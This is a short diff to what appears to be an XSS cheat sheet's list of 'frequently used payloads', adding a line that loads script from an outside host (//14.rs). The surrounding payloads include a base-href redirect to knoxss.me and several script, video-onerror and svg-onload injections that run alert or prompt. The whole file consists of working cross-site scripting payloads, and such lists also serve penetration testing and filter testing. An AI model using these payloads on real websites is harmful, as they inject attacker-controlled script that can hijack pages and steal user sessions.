@@ -4,6 +4,7 @@ http://seguretat.wiki.uoc.edu/index.php/XSS_Cheat_Sheet
 
 Frequently used Payloads:
 <base href=//knoxss.me?>
+<script src=//14.rs>
 '"><script>alert(-1)</script><
 <video><source src=x onerror=alert(-2)></video>
 '"></script><svg onload=prompt(-3)>
